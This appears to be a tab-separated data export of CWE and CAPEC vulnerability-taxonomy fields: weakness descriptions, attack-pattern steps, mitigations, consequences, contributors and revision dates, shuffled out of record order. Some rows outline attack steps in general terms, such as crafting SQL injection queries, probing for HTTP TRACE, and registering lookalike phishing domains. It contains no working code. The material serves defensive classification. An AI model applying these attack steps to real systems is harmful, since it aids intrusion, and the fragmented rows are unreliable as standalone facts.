13565	23	The product has an attack surface whose quantitative      measurement exceeds a desirable maximum.
18216	57	Indirect
24110	35	MITRE
21680	40	The targeted business's UDDI or ebXML information must be served from a location that the attacker can spoof or compromise or the attacker must be able to intercept and modify unsecured UDDI/ebXML messages in transit.
6080	28	CWE Content Team
7770	40	This type of an attack requires the target system to be running a vulnerable implementation of IP, and the attacker needs to ability to send arbitrary sized ICMP packets to the target.
7163	51	2014-06-23
16779	62	updated Description
15137	77	Dynamic Analysis with Automated Results Interpretation
10566	76	2019-09-30
11691	31	1000
21204	69	Draft
24391	35	MITRE
24507	39	2014-07-30
10810	81	Confidentiality
17967	35	MITRE
8808	28	Eric Dalci
12086	40	This type of an attack requires the existence of a 3rd party service that generates a response that is significantly larger than the request that triggers it.
14237	100	The MITRE Corporation
14217	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
22293	62	updated Relationships, Taxonomy_Mappings
19042	59	Updated Activation_Zone, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Resources_Required
14298	28	CWE Content Team
23367	100	The MITRE Corporation
23338	35	MITRE
20140	35	MITRE
11196	55	CAPEC Content Team
22440	28	CWE Content Team
13668	39	2008-07-01
5797	26	Operation
12877	39	2008-07-01
6126	63	Read Application Data
11505	39	2011-03-29
19336	39	2014-07-30
12824	39	2011-06-01
7662	28	CWE Content Team
14426	81	Access Control
10947	23	The software initializes a data element using a hard-coded      literal that is not a simple integer or static constant element.
13490	53	The MITRE Corporation
12294	28	CWE Content Team
12139	103	Primary
16819	103	Primary
16168	28	CWE Content Team
21193	45	Class
18330	35	MITRE
9154	35	MITRE
16535	76	2019-09-30
17115	62	updated Related_Attack_Patterns, Relationships
16712	62	updated Relationships
12462	79	Authorization
23308	39	2019-06-20
12350	26	Architecture and Design
15825	35	MITRE
22348	44	SOAR Partial
25097	35	MITRE
20412	50	Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.
14116	62	updated Relationships, Other_Notes, Taxonomy_Mappings
20006	39	2011-06-01
22959	73	Determine whether UTF-16 encoding is accepted by the application/system.
25252	26	Implementation
22014	50	Assess design documentation prior to development to ensure that they function as intended and without any malicious functionality.
7764	43	Simple
18457	102	ChildOf
6207	81	Access Control
11941	39	2009-05-27
16905	62	updated Common_Consequences
20939	78	Medium
6528	102	ChildOf
6901	28	CWE Content Team
10085	23	A software system that accepts path input in the form of leading space (' filedir') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
15156	62	updated Taxonomy_Mappings
11136	66	Memory Management
24546	62	updated Applicable_Platforms, Common_Consequences, Description, Likelihood_of_Exploit, Relationships, Other_Notes, Taxonomy_Mappings
12160	50	Implementation: Provide for network flow control and traffic shaping to control access to the resources.
24412	28	CWE Content Team
20516	33	iOS Developer Library
11903	85	388
21265	28	CWE Content Team
17585	53	The MITRE Corporation
7321	62	updated Relationships, Taxonomy_Mappings
15246	35	MITRE
20197	76	2015-12-07
11577	103	Primary
5884	63	Other
17624	42	Use static analysis tools to spot return of the address of a stack variable.
8088	56	ChildOf
17280	28	CWE Content Team
11391	88	Non-SQL Invokable Control Element with Excessive Number of Data Resource Accesses
18747	62	updated Potential_Mitigations
14878	49	2014
7585	28	CWE Content Team
9032	39	2011-06-27
17639	69	Draft
21180	28	CWE Content Team
22608	35	MITRE
13663	28	CWE Content Team
13419	35	MITRE
8792	26	Implementation
23215	66	Shocking News in PHP Exploitation
6812	56	ChildOf
17370	77	Dynamic Analysis with Automated Results Interpretation
21063	42	Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the software. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type.
9351	28	CWE Content Team
13383	72	Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.
12106	35	MITRE
10116	35	Cigital
20632	62	updated Relationships
11854	81	Confidentiality
10381	91	Operation
17778	94	Run Arbitrary Code
13492	31	699
23041	91	Architecture and Design
14501	28	CWE Content Team
8734	35	MITRE
14738	62	updated Relationships, Taxonomy_Mappings
18068	39	2011-03-29
9890	44	High
23765	62	updated Observed_Examples, Relationships
13474	62	updated Relationships
18628	39	2015-12-07
12920	69	Incomplete
25068	39	2011-09-13
10374	31	1000
19872	50	Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.
18820	59	Updated Related_Attack_Patterns
9709	33	Thomas Ptacek
5727	56	ChildOf
12900	62	updated Potential_Mitigations
23573	31	699
7017	43	Simple
17380	62	updated Related_Attack_Patterns
23531	35	Cigital
5597	59	Updated Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, References, Related_Vulnerabilities
10906	62	updated Related_Attack_Patterns, Relationships
11706	23	An adversary introduces malicious hardware during an update or replacement procedure, allowing for additional compromise or site disruption at the victim location. After deployment, it is not uncommon for upgrades and replacements to occur involving hardware and various replaceable parts. These upgrades and replacements are intended to correct defects, provide additional features, and to replace broken or worn-out parts. However, by forcing or tricking the replacement of a good component with a defective or corrupted component, an adversary can leverage known defects to obtain a desired malicious impact.
21077	52	Manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all file access operations can be assessed within limited time constraints.
22060	81	Integrity
14944	47	Bypass Protection Mechanism
16827	74	3
11886	40	The target application must include external code/libraries that are executed when the application runs and the adversary must be able to influence the specific files that get included.
23387	56	ChildOf
18546	46	Public static variables can be read without an accessor and changed without a mutator by any classes in the application.
6579	35	MITRE
16459	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
23912	103	Primary
9324	33	Mark Dowd
16587	35	MITRE
9912	39	2008-07-01
13145	79	Confidentiality
6646	33	Michael Howard
7349	28	CWE Content Team
23344	42	Restrict server socket address to known local addresses.
21508	28	CWE Content Team
18373	28	CWE Content Team
14243	56	ChildOf
6507	81	Other
21458	35	MITRE
24716	31	1000
21639	26	Operation
17586	45	Variant
13598	26	Architecture and Design
5898	35	Cigital
9231	90	Language-Independent
15551	62	updated Enabling_Factors_for_Exploitation, Other_Notes, Relationship_Notes
22846	51	2014-06-23
7950	101	CAPEC Content Team
23014	39	2017-05-03
23854	28	Sean Eidemiller
19196	63	Execute Unauthorized Code or Commands
13892	56	ChildOf
5976	103	Primary
17656	35	MITRE
19125	31	699
11182	40	The application performs insufficient filtering/canonicalization on the URLs.
8855	72	The typical consequence is CPU consumption, but memory consumption and consumption of other resources can also occur.
23527	81	Confidentiality
18070	28	CWE Content Team
17230	63	Execute Unauthorized Code or Commands
13578	59	Updated @Abstraction
22264	39	2012-10-30
10254	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
16280	39	2011-06-01
6116	35	MITRE
19164	62	updated Relationships
18126	95	[Exploit SQL Injection vulnerability] After refining and adding various logic to SQL queries, craft and execute the underlying SQL query that will be used to attack the target system. The goal is to reveal, modify, and/or delete database data, using the knowledge obtained in the previous step. This could entail crafting and executing multiple SQL queries if a denial of service attack is the intent.
20053	31	1003
19895	89	Detailed
16143	80	In order to discover unrestricted resources, the attacker does not need special tools or skills. He only has to observe the resources or access mechanisms invoked as each action is performed and then try and access those access mechanisms directly.
17170	62	updated Related_Attack_Patterns
9333	39	2014-07-30
11502	56	ChildOf
7846	61	Draft
12504	101	CAPEC Content Team
14519	92	Exploit
14186	95	[Determine if HTTP Trace is enabled] Determine if HTTP Trace is enabled at the web server with which the victim has a an active session
15109	62	updated Related_Attack_Patterns, Relationships
11293	73	Send requests to the web server for common directory names
21274	62	updated Common_Consequences
20160	63	Read Application Data
6223	28	CWE Content Team
10034	56	ChildOf
10423	21	PLOVER
6998	39	2009-03-10
20542	35	MITRE
5728	28	CWE Content Team
16400	28	CWE Content Team
24833	39	2011-06-01
5733	88	Improper Neutralization of Server-Side Includes (SSI) Within a Web Page
8305	35	MITRE
7113	102	ChildOf
19704	39	2008-10-14
23676	39	2008-07-01
17215	62	updated Common_Consequences
20958	35	MITRE
9457	50	Implementation: Only allow known files to be included (whitelist)
14272	31	1000
12572	39	2010-09-27
24131	39	2009-05-20
18678	33	Viktoria Felmetsger
9556	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction
14129	63	DoS: Crash, Exit, or Restart
21955	39	2009-10-29
19711	76	2018-07-31
17999	35	MITRE
14433	31	699
22018	42	Map every Action Form to a corresponding validation form.                   An action or a form may perform validation in other ways, but the Struts Validator provides an excellent way to verify that all input receives at least a basic level of validation. Without this approach, it is difficult, and often impossible, to establish with a high level of confidence that all input is validated.
15123	25	Medium
7211	42	Use a language that provides abstractions for memory allocation and deallocation.
17251	91	Architecture and Design
18403	35	MITRE
24900	35	MITRE
12188	91	Implementation
21125	28	CWE Content Team
12500	94	Capture all cellular and RF traffic from mobile and retransmission devices. Move bulk traffic capture to storage area for cryptanalysis of encrypted traffic, and telemetry analysis of non-encrypted data. (packet headers, cellular power data, signal strength, etc.)
16926	74	1
13827	39	2011-06-01
19898	86	http://www.eg.bucknell.edu/~mead/Java-tutorial/native1.1/index.html
8124	56	ChildOf
8578	100	The MITRE Corporation
10462	28	CWE Content Team
11153	23	The software protects a primary channel, but it does not use the same level of protection for an alternate channel.
24163	62	updated Maintenance_Notes, Other_Notes, Potential_Mitigations
7927	35	MITRE
22037	39	2019-09-19
8804	35	Cigital
22422	23	An adversary creates a false front organizations with the appearance of a legitimate supplier in the critical life cycle path that then injects corrupted/malicious information system components into the organizational supply chain.
11141	62	updated References
22934	34	Developers sometimes believe that they cannot defend the application from someone who has access to the configuration, but this belief makes an attacker's job easier.
9006	88	Unquoted Search Path or Element
18437	26	Implementation
14303	35	Veracode
10655	24	MITRE
20377	101	CAPEC Content Team
20814	50	Employ a robust identification and audit/blocking via whitelisting of applications on your system. Malware may contain the functionality associated with this attack pattern.
10991	42	It is good practice to be responsible for freeing all resources you allocate and to be consistent with how and where you free resources in a function. If you allocate resources that you intend to free upon completion of the function, you must be sure to free the resources at all exit points for that function including error conditions.
20650	28	CWE Content Team
11941	28	CWE Content Team
9346	50	Apply the principle of least privilege.
14884	35	MITRE
21219	39	2011-06-01
7959	47	Execute Unauthorized Commands
19452	21	PLOVER
16051	35	MITRE
24825	28	Eric Dalci
20093	74	2
22366	31	1000
22057	97	Path Traversal
15952	100	The MITRE Corporation
7429	35	MITRE
22642	102	CanPrecede
6358	76	2017-01-09
18507	85	34
13111	96	2011-03-24
6341	81	Confidentiality
17006	76	2015-11-09
10846	91	Operation
11871	39	2009-03-10
17815	35	MITRE
17109	39	2008-09-08
15906	35	MITRE
7305	62	updated Potential_Mitigations
13621	73	Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).
6543	31	1000
7449	48	09
9229	47	Execute Unauthorized Commands
18770	35	Cigital
16055	79	Integrity
12211	28	CWE Content Team
8059	63	Bypass Protection Mechanism
21121	28	CWE Content Team
13107	85	446
22788	39	2010-04-05
23970	23	The software receives data from an upstream component, but does not completely filter one or more instances of special elements before sending it to a downstream component.
17163	42	Use equals() to compare strings.
14199	50	Frequent changes to secret keys and certificates.
6350	35	MITRE
18050	39	2012-10-30
6839	39	2017-11-08
15202	31	1000
18172	81	Access Control
9529	91	Implementation
19532	62	updated Relationships
15626	89	Detailed
18213	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Other_Notes
15879	39	2008-11-24
13137	103	Primary
13638	39	2008-09-08
24961	56	ChildOf
23949	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
9584	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
15750	61	Draft
18559	88	UNIX Symbolic Link (Symlink) Following
18840	62	updated Related_Attack_Patterns
21604	35	MITRE
20960	35	MITRE
23154	50	Utilize proper character encoding for all output produced within client-site scripts manipulating the DOM.
16643	62	fixed incorrect manipulation in name (desc was correct).
11399	46	When a weakness occurs in functionality that is accessible by lower-privileged users, then without strong boundaries, an attack might extend the scope of the damage to higher-privileged users.
12357	43	Simple
23938	87	Web Server
14026	66	Blacklist defenses as a breeding ground for vulnerability variants
14707	62	updated Relationships, Taxonomy_Mappings
23107	39	2010-02-16
14322	43	Simple
15440	39	2012-10-30
8843	39	2017-11-08
20802	26	Implementation
22113	79	Confidentiality
8517	79	Authorization
8651	91	Architecture and Design
16998	39	2010-09-27
7470	62	updated Time_of_Introduction
8655	69	Draft
11362	76	2018-07-31
15460	50	Mitigating this attack requires countermeasures employed on both the retransmission device as well as on the cell tower. Therefore, any system that relies on existing commercial cell towards will likely be vulnerable to this attack. By using a private cellular LTE network (i.e., a custom cell tower), jamming countermeasures could be developed and employed.
16682	81	Integrity
11701	62	updated Relationships
20139	62	updated Description, Name
13307	91	Implementation
21812	90	Language-Independent
9025	56	ChildOf
18165	35	MITRE
7590	31	1000
13623	35	MITRE
13679	97	Hijacking a Privileged Thread of Execution
13959	28	CWE Content Team
6153	51	2014-06-23
10219	62	updated Common_Consequences
10966	26	Operation
10459	89	Standard
8241	62	updated Demonstrative_Examples
21292	63	DoS: Resource Consumption (Memory)
11138	39	2010-09-27
21684	100	The MITRE Corporation
20804	81	Other
8032	28	CWE Content Team
18610	30	Gustave Rydstedt, Elie Bursztein, Dan Boneh, and Collin Jackson
17751	62	updated Potential_Mitigations
23048	100	The MITRE Corporation
9174	101	CAPEC Content Team
18179	81	Availability
16048	39	2011-03-29
13790	81	Integrity
17693	28	CWE Content Team
13073	88	Write-what-where Condition
15955	24	MITRE
14500	35	MITRE
16220	66	Authenticode
6223	62	updated Demonstrative_Examples
22289	78	Low
20434	39	2010-02-16
19188	42	Carefully check each input parameter against a rigorous positive specification (whitelist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.
9013	35	MITRE
16515	35	MITRE
8333	70	WASC Threat Classification 2.0
24224	31	1003
8684	40	None
14704	45	Variant
7245	62	updated Common_Consequences
9395	76	2017-08-04
22608	39	2009-01-12
23732	31	1000
18475	35	MITRE
7473	62	updated Relationships, Taxonomy_Mappings
16155	39	2009-05-27
6788	33	Niels Dekker
18323	56	ChildOf
22353	91	Architecture and Design
7391	39	2008-09-08
8966	23	An adversary sends an ICMP Type 17 Address Mask Request to gather information about a target's networking configuration. ICMP Address Mask Requests are defined by RFC-950, "Internet Standard Subnetting Procedure." An Address Mask Request is an ICMP type 17 message that triggers a remote system to respond with a list of its related subnets, as well as its default gateway and broadcast address via an ICMP type 18 Address Mask Reply datagram. Gathering this type of information helps the adversary plan router-based attacks as well as denial-of-service attacks against the broadcast address. Many modern operating systems will not respond to ICMP type 17 messages for security reasons. Determining whether a system or router will respond to an ICMP Address Mask Request helps the adversary determine operating system or firmware version. Additionally, because these types of messages are rare, they are easily spotted by intrusion detection systems. Many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 17 and egress ICMP type 18 messages.
14073	35	Cigital
7881	62	updated Time_of_Introduction
21344	28	CWE Content Team
7930	62	updated References, Relationships, Taxonomy_Mappings
18099	28	CWE Content Team
9556	44	High
7703	80	Causing arbitrary code to execute on the target system.
7131	62	updated Relationships
15257	39	2017-11-08
22031	79	Confidentiality
5848	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
18010	48	02
15416	28	CWE Content Team
19504	94	Depending on the adversary's intended technical impact, a successful attack of this kind can compromise any or all elements of the security triad.
24744	59	Updated Description Summary, Related_Attack_Patterns
19410	86	http://info.sen.ca.gov/pub/01-02/bill/sen/sb_1351-1400/sb_1386_bill_20020926_chaptered.html
7890	62	updated Relationships, Taxonomy_Mappings
18671	28	CWE Content Team
17987	62	updated Potential_Mitigations
17933	56	ChildOf
15218	45	Class
19654	36	https://www.helpnetsecurity.com/dl/articles/Ajax_fingerprinting.pdf
20489	39	2011-06-27
17631	63	Modify Application Data
13079	28	CWE Content Team
5600	35	MITRE
10264	81	Availability
14814	46	If the incorrect group has more access or privileges than the intended group, the user might be able to bypass intended security policy to access unexpected resources or perform unexpected actions. The access-control system might not be able to detect malicious usage of this group membership.
5628	35	Cigital
7885	28	CWE Content Team
22776	31	1000
10292	42	Apply appropriate access control authorizations for each access to all restricted URLs, scripts or files.
22710	31	1000
14979	56	ChildOf
10336	56	CanAlsoBe
11086	70	A comprehensive tutorial on cross-site scripting
19185	31	1000
20115	42	Place sanity checks on all incremented variables to ensure that they remain within reasonable bounds.
7142	49	2001
10474	28	CWE Content Team
16513	80	An attacker can use a tool to scan and automatically launch an attack against known issues. A tool can also repeat a sequence of instructions and try to brute force the service on the host target, an example of that would be the flooding technique.
5686	81	Other
20064	39	2012-10-30
20224	81	Confidentiality
8350	97	File Manipulation
12355	26	Implementation
15768	56	ChildOf
12897	61	Stable
19390	62	updated Relationships, Taxonomy_Mappings
11881	73	Gain access to sensitive files.
8229	74	1
23006	28	CWE Content Team
7979	35	MITRE
12505	28	CWE Content Team
21054	31	1000
10540	39	2009-05-27
23706	28	CWE Content Team
21361	54	High
12646	73	Craft underlying malicious URL and send it to the web server to take control of the embedding HTML document.
17388	88	Creation of Class Instance within a Static Code Block
12370	81	Confidentiality
11011	76	2015-12-07
15626	85	9
14987	35	MITRE
13507	61	Draft
8776	46	This typically results from new data that is not as long as the old data, which leaves portions of the old data still available. Equivalent errors can occur in other situations where the length of data is variable but the associated data structure is not. If memory is not cleared after use, it may allow unintended actors to read the data when the memory is reallocated.
17011	39	2017-01-19
18868	97	WebView Injection
19020	81	Confidentiality
6984	97	Input Data Manipulation
22428	39	2017-11-08
12795	35	MITRE
7307	66	How To Safely Store A Password
12912	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
12642	72	This weakness will generally lead to undefined behavior and therefore crashes. In the case of overflows involving loop index variables, the likelihood of infinite loops is also high.
8750	35	MITRE
23205	35	MITRE
20321	59	Updated Related_Attack_Patterns
14321	39	2008-09-08
20232	31	1000
21740	62	updated Description, Name, Observed_Examples, Other_Notes, Theoretical_Notes
12466	56	ChildOf
6272	54	Medium
10523	102	ChildOf
23454	42	If at all possible, use library calls rather than external processes to recreate the desired functionality.
20742	26	Implementation
10378	85	252
6220	35	MITRE
10616	24	MITRE
23230	31	699
9293	47	Bypass Protection Mechanism
17213	28	CWE Content Team
22992	101	CAPEC Content Team
9427	28	CWE Content Team
13094	28	CWE Content Team
18511	61	Stable
10041	100	The MITRE Corporation
12362	81	Other
17891	53	The MITRE Corporation
12713	104	78
23923	28	CWE Content Team
13627	102	ChildOf
6762	47	Hide Activities
19007	35	MITRE
13537	54	Low
20285	31	1000
22334	89	Standard
9232	39	2008-10-14
14444	31	1000
24568	39	2008-07-01
8572	92	Exploit
15770	72	Exposing the contents of a directory can lead to an attacker gaining access to source code or providing useful information for the attacker to devise exploits, such as creation times of files or any information that may be encoded in file names. The directory listing may also compromise private or confidential data.
22814	28	Eric Dalci
25096	33	Ferruh Mavituna
13882	76	2017-01-09
17874	35	MITRE
15866	56	ChildOf
12270	35	MITRE
9067	81	Integrity
8230	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
19647	86	https://mathiasbynens.github.io/rel-noopener/
17756	61	Stable
10480	39	2013-07-17
15517	28	CWE Content Team
25418	35	MITRE
16651	78	Very High
20297	62	updated Relationships, Other_Notes
20556	62	updated Demonstrative_Examples
17247	56	ChildOf
17432	90	C
16492	31	1000
22704	62	updated Common_Consequences
18005	39	2015-12-07
18822	35	MITRE
11453	81	Access Control
10045	62	updated Likelihood_of_Exploit
23176	28	CWE Content Team
10824	77	Black Box
23249	88	Exposure of Sensitive Data Through Data Queries
21441	39	2011-06-27
16921	35	MITRE
7482	39	2019-01-03
14716	102	ChildOf
19826	28	CWE Content Team
21354	35	MITRE
19247	28	CWE Content Team
19288	88	Excessive Platform Resource Consumption within a Loop
17150	76	2019-04-04
17936	62	updated Common_Consequences
9418	76	2017-05-01
7416	31	1000
7888	28	CWE Content Team
19067	43	Simple
9959	40	The adversary requires logical access to the target network in order to carry out host discovery.
14556	39	2008-10-14
21780	35	MITRE
17543	28	CWE Content Team
10817	39	2008-09-08
18671	62	updated Relationships
10152	62	updated Applicable_Platforms, Demonstrative_Examples
19522	86	http://www.slideshare.net/RafalLos/defying-logic-business-logic-testing-with-automation
22441	93	Limited
24514	28	CWE Content Team
6147	28	CWE Content Team
23070	100	The MITRE Corporation
15673	62	updated Common_Consequences
18546	58	When a field is declared public but not final, the field can be read and written to by arbitrary Java code.
8039	47	Read Data
24755	39	2019-01-03
16187	62	updated Relationships
12818	71	2011
12872	81	Access Control
16848	62	updated Relationships
13286	28	CWE Content Team
19439	92	Experiment
19213	103	Primary
6432	28	CWE Content Team
17055	69	Stable
16364	28	CWE Content Team
6395	39	2008-07-01
18549	56	ChildOf
10317	47	Gain Privileges
10183	39	2014-06-23
13686	39	2008-07-01
7367	88	Use of Incorrectly-Resolved Name or Reference
18133	24	MITRE
14300	39	2008-11-24
23429	26	Implementation
11221	28	CWE Content Team
15774	61	Draft
17808	35	MITRE
8082	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
21372	73	Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L)
20396	46	Allowing external control of system settings can disrupt service or cause an application to behave in unexpected, and potentially malicious ways.
10924	28	CWE Content Team
14092	80	Hijacking a thread involves knowledge of how processes and threads function on the target platform, the design of the target application as well as the ability to identify the primitives to be used or manipulated to hijack the thread.
21548	28	CWE Content Team
23273	39	2017-11-08
16075	90	Language-Independent
22499	28	CWE Content Team
19333	101	CAPEC Content Team
7171	81	Access Control
8356	35	MITRE
22007	33	Shaun Colley
24651	33	Subodh Iyengar
15566	35	MITRE
17663	39	2017-11-08
16717	35	MITRE
17014	62	updated Relationships
21304	39	2010-06-21
11153	69	Draft
20022	59	Updated Attack_Prerequisites, Description Summary, Resources_Required
13179	62	updated Name
15610	43	Simple
19365	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
18647	81	Integrity
9348	59	Updated Attacker_Skills_or_Knowledge_Required, Description, Description Summary, Related_Weaknesses, Resources_Required
20703	62	updated Relationships, Other_Notes, Taxonomy_Mappings
24804	23	The software constructs pathnames from user input, but it does not handle or incorrectly handles a pathname containing a Windows device name such as AUX or CON. This typically leads to denial of service or an information exposure when the application attempts to process the pathname as a regular file.
18127	63	Varies by Context
14260	43	Simple
21520	31	1000
23651	101	CAPEC Content Team
12449	35	MITRE
21747	28	CWE Content Team
24429	35	MITRE
13860	56	ChildOf
11853	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
17730	28	CWE Content Team
7901	78	Medium
16169	39	2011-06-01
20289	56	ChildOf
23961	51	2018-05-15
6144	90	Language-Independent
16698	67	Medium
19112	39	2011-06-27
13281	90	Language-Independent
21077	44	High
21244	62	updated Potential_Mitigations
9456	39	2011-06-01
9405	39	2008-09-08
25299	63	Hide Activities
22731	35	MITRE
9220	35	MITRE
17841	45	Variant
14381	31	1000
20423	39	2014-07-30
8483	26	Installation
6336	28	CWE Content Team
16697	85	240
19131	62	updated Potential_Mitigations, Time_of_Introduction
15468	81	Confidentiality
15005	39	2014-02-18
14489	44	SOAR Partial
7979	62	updated Relationships
13948	97	Malicious Manual Software Update
15742	102	ChildOf
21784	62	updated Demonstrative_Examples, Description, Other_Notes, Potential_Mitigations, References
20933	62	updated Relationships
19703	63	Modify Application Data
12185	23	The adversary gains information via non-verbal means from the target through eye movements.
18795	62	updated Potential_Mitigations, Time_of_Introduction
17037	91	Implementation
13437	63	DoS: Crash, Exit, or Restart
21724	28	CWE Content Team
15626	50	Use an abstraction library to abstract away risky APIs. Not a complete solution.
18005	35	MITRE
24199	35	MITRE
10628	35	MITRE
6503	62	updated Relationships
23998	28	CWE Content Team
14832	61	Draft
20505	35	Cigital
11641	55	CAPEC Content Team
23377	79	Availability
11191	28	CWE Content Team
23274	91	Architecture and Design
12139	31	1000
13437	72	NULL pointer dereferences usually result in the failure of the process unless exception handling (on some platforms) is available and implemented. Even when exception handling is being used, it can still be very difficult to return the software to a safe state of operation.
10446	63	Quality Degradation
8961	39	2012-05-11
10868	42	Always verify the integrity of the software that is being installed.
6021	62	updated Time_of_Introduction
20455	35	MITRE
22868	39	2011-06-27
10688	104	334
14244	62	updated Demonstrative_Examples, Relationships
10876	42	If you suspect misuse of umask(), you can use grep to spot call instances of umask().
14590	35	MITRE
22827	39	2008-07-01
11900	63	DoS: Resource Consumption (Other)
25412	39	2019-06-20
14235	28	CWE Content Team
10593	39	2008-11-24
19875	28	CWE Content Team
14695	57	Primary
16058	39	2012-05-11
9276	81	Access Control
21119	43	Chain
10980	76	2018-07-31
24731	66	Computational complexity theory)
9507	31	1000
23414	103	Primary
24975	81	Availability
18522	27	None: No specialized resources are required to execute this type of attack.
8021	21	7 Pernicious Kingdoms
6491	28	CWE Content Team
11819	24	MITRE
23151	62	updated Applicable_Platforms
15948	52	Manual dynamic analysis may be effective in detecting the use of custom permissions models and functions. The program could then be executed with a focus on exercising code paths that are related to the custom permissions. Then the human analyst could evaluate permission assignments in the context of the intended security model of the software.
8208	39	2012-10-30
15548	35	MITRE
16904	94	A successful attack can enable an adversary to gain unauthorized access to an application.
11907	28	CWE Content Team
11515	62	updated Relationships
16417	102	ChildOf
7749	104	794
12758	104	156
7827	28	CWE Content Team
14613	62	updated Related_Attack_Patterns
17156	39	2017-11-08
8498	26	Implementation
22685	62	updated Relationships, Taxonomy_Mappings
12754	28	Eric Dalci
8443	73	Access the files via direct URL and capture contents.
16388	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
13366	35	Cigital
18084	32	The Web Application Security Consortium (WASC)
18805	51	2014-06-23
20745	86	http://www.webappsec.org/projects/wafec/v1/wasc-wafec-v1.0.html
25196	69	Draft
20810	31	1000
12171	39	2008-09-08
16552	62	updated Relationships
8298	31	1003
5979	96	2008-01-18
20982	28	CWE Content Team
15614	35	MITRE
23956	28	CWE Content Team
11004	94	Run Arbitrary Code
22195	90	C++
9654	54	High
18686	39	2009-10-29
7707	35	MITRE
18041	74	3
12768	28	CWE Content Team
18104	100	The MITRE Corporation
13667	76	2019-09-30
23587	56	ChildOf
25131	39	2011-06-01
19812	62	added/updated demonstrative examples
24301	39	2012-10-30
13187	28	CWE Content Team
6870	62	updated References, Relationships
6865	39	2017-11-08
19939	73	TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, he attempts to guess the actual operating system.
17853	28	CWE Content Team
19260	100	The MITRE Corporation
16328	62	updated Common_Consequences
16465	62	updated Common_Consequences
17432	23	A heap overflow condition is a buffer overflow, where the buffer that can be overwritten is allocated in the heap portion of memory, generally meaning that the buffer was allocated using a routine such as malloc().
11030	100	The MITRE Corporation
5601	47	Gain Privileges
25090	104	522
13875	78	Medium
23640	81	Confidentiality
14725	26	Implementation
9298	39	2011-09-13
20421	56	ChildOf
11408	102	ChildOf
19822	56	ChildOf
24386	39	2008-09-08
17808	39	2011-06-01
21357	35	MITRE
23522	39	2008-07-01
7182	42	Applications should set up an SSL_CTX completely, before creating SSL objects from it.
14030	81	Access Control
18361	62	updated Relationships, Taxonomy_Mappings
20604	33	Michael Howard
14672	40	The target application must fail to sanitize incoming messages adequately before processing.
12279	39	2019-01-03
16051	62	updated Relationships
11631	56	ChildOf
19494	28	CWE Content Team
23413	35	MITRE
13457	56	ChildOf
18415	39	2010-12-13
17260	78	High
18713	45	Base
21003	28	CWE Content Team
25428	28	Eric Dalci
16363	28	CWE Content Team
12174	28	CWE Content Team
20627	39	2011-06-01
15608	48	03
